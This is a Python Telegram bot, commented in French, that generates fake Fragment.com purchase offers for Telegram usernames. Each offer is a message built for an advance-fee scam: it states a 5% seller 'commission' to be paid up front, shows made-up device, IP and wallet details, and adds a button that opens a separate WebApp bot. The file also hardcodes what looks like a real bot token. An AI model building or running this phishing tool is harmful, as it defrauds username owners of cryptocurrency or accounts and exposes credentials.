import logging
import asyncio
import aiohttp
import signal
import sys
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.error import NetworkError, TimedOut, Conflict

# Configuration du logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelName)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Réduction des logs telegram
telegram_logger = logging.getLogger('telegram')
telegram_logger.setLevel(logging.WARNING)

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
FIXED_CHAT_ID = 511758924

print(f"🔍 DEBUG: BOT_TOKEN configuré: ✅")
print(f"🔍 DEBUG: CHAT_ID fixe: {FIXED_CHAT_ID}")

# Variable globale pour l'application
app = None

# ===== FONCTION PRIX TON =====
async def get_ton_price():
    """Récupère le prix du TON en USD via l'API DIA"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000", 
                timeout=10
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    return float(data.get('Price', 5.50))
                else:
                    logger.warning(f"Erreur API DIA: {response.status}")
                    return 5.50
    except Exception as e:
        logger.warning(f"Erreur récupération prix TON: {e}")
        return 5.50

# ===== FONCTION GÉNÉRATION MESSAGE =====
async def generate_fragment_message(username, price):
    """Génère le message Fragment avec calculs en temps réel"""
    try:
        # Calculs
        commission = price * 0.05
        ton_to_usd = await get_ton_price()
        price_usd = price * ton_to_usd
        commission_usd = commission * ton_to_usd
        
        # Message personnalisé
        message = f"""We have received a purchase request for your username @{username.upper()} via Fragment.com. Below are the transaction details:

**• Offer Amount: 💎{price:g} TON (${price_usd:.2f} USD)
• Commission: 💎{commission:g} TON (${commission_usd:.2f} USD)**

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: [EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U](https://tonviewer.com/EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U)

Important:
**• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message.**"""

        # Bouton vers WebApp
        button_url = f"https://t.me/BidRequestWebApp_bot/WebApp?startapp={username}-{price:g}"
        keyboard = [[InlineKeyboardButton("View details", url=button_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        return message, reply_markup
        
    except Exception as e:
        logger.error(f"Erreur génération message: {e}")
        return None, None

# ===== GESTIONNAIRE D'ERREURS =====
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire global des erreurs"""
    logger.error(f"Exception while handling an update: {context.error}")
    
    # Gestion spécifique des erreurs réseau
    if isinstance(context.error, (NetworkError, TimedOut)):
        logger.warning("Erreur réseau détectée, tentative de reconnexion...")
        return
    
    # Gestion des conflits de polling
    if isinstance(context.error, Conflict):
        logger.error("Conflit de polling détecté - arrêt du bot")
        if app:
            await app.stop()
        return
    
    # Log des autres erreurs
    if update:
        logger.error(f"Update {update} caused error {context.error}")

# ===== COMMANDES TELEGRAM =====
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /start"""
    try:
        user = update.effective_user
        chat_id = update.effective_chat.id
        
        message = f"""🤖 **Fragment Deal Generator**

Bonjour {user.first_name}! 

📱 **Votre Chat ID:** `{chat_id}`

Ce bot génère automatiquement des messages Fragment personnalisés.

**Commandes disponibles:**
• `/create username price` - Créer un message Fragment
• `/help` - Aide

💎 **Prêt à créer vos deals!**"""
        
        await update.message.reply_text(message, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Erreur start_command: {e}")
        await update.message.reply_text("❌ Erreur lors de l'exécution de la commande")

async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /create username price"""
    try:
        if len(context.args) != 2:
            await update.message.reply_text(
                "❌ **Usage:** `/create username price`\n"
                "📝 **Exemple:** `/create crypto 1000`",
                parse_mode='Markdown'
            )
            return
            
        username = context.args[0].strip().lower()
        try:
            price = float(context.args[1])
        except ValueError:
            await update.message.reply_text("❌ Format de prix invalide (utilisez des chiffres)")
            return
        
        if price <= 0:
            await update.message.reply_text("❌ Le prix doit être supérieur à 0")
            return
            
        # Message de confirmation
        await update.message.reply_text(
            f"⏳ **Génération du deal...**\n"
            f"👤 Username: @{username}\n"
            f"💰 Prix: {price} TON",
            parse_mode='Markdown'
        )
        
        # Génération du message
        message, reply_markup = await generate_fragment_message(username, price)
        
        if message and reply_markup:
            # Envoi du message Fragment
            await update.message.reply_text(
                message,
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            
            # Confirmation de succès
            await update.message.reply_text(
                f"✅ **Deal créé avec succès!**\n"
                f"🎯 Message Fragment généré pour @{username}\n"
                f"💎 Montant: {price} TON\n"
                f"🔗 Bouton WebApp ajouté",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ Erreur lors de la génération du message")
            
    except Exception as e:
        logger.error(f"Erreur create_command: {e}")
        await update.message.reply_text(f"❌ Erreur: Une erreur s'est produite")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande d'aide"""
    try:
        help_text = """🤖 **Fragment Deal Generator - Aide**

**Commandes disponibles:**
• `/start` - Informations et Chat ID
• `/create username price` - Créer un message Fragment
• `/help` - Cette aide

**Fonctionnalités:**
✅ Messages Fragment automatiques
✅ Calcul prix TON en temps réel  
✅ Boutons WebApp intégrés
✅ Commission 5% calculée automatiquement

**Exemple d'utilisation:**
`/create crypto 1500`

💎 **Bot prêt à l'emploi!**"""
        
        await update.message.reply_text(help_text, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Erreur help_command: {e}")
        await update.message.reply_text("❌ Erreur lors de l'affichage de l'aide")

# ===== GESTIONNAIRE DE SIGNAUX =====
def signal_handler(signum, frame):
    """Gestionnaire pour arrêt propre"""
    logger.info("Signal reçu, arrêt du bot...")
    if app:
        asyncio.create_task(app.stop())
    sys.exit(0)

# ===== FONCTION PRINCIPALE =====
def main():
    """Fonction principale"""
    global app
    
    try:
        # Gestionnaires de signaux
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        # Application Telegram avec configuration robuste
        app = Application.builder()\
            .token(BOT_TOKEN)\
            .read_timeout(30)\
            .write_timeout(30)\
            .connect_timeout(30)\
            .pool_timeout(30)\
            .build()
        
        # Ajout du gestionnaire d'erreurs
        app.add_error_handler(error_handler)
        
        # Ajout des gestionnaires de commandes
        app.add_handler(CommandHandler("start", start_command))
        app.add_handler(CommandHandler("create", create_command))
        app.add_handler(CommandHandler("help", help_command))
        
        print("🚀 Fragment Deal Generator démarré...")
        print(f"💎 Chat ID configuré: {FIXED_CHAT_ID}")
        print(f"🔗 WebApp: BidRequestWebApp_bot/WebApp")
        print("🤖 Mode: Autonome (commandes Telegram)")
        print("🛡️ Gestionnaire d'erreurs: Activé")
        print("\n📋 Commandes disponibles:")
        print("   • /start - Démarrer le bot")
        print("   • /create username price - Créer un deal")
        print("   • /help - Aide")
        
        # Démarrage en polling avec gestion d'erreurs
        app.run_polling(
            drop_pending_updates=True,
            allowed_updates=['message'],
            close_loop=False,
            stop_signals=None  # Gestion manuelle des signaux
        )
        
    except Conflict as e:
        logger.error(f"❌ Conflit de polling: {e}")
        logger.info("💡 Une autre instance du bot est déjà en cours d'exécution")
        sys.exit(1)
        
    except Exception as e:
        logger.error(f"❌ Erreur démarrage: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
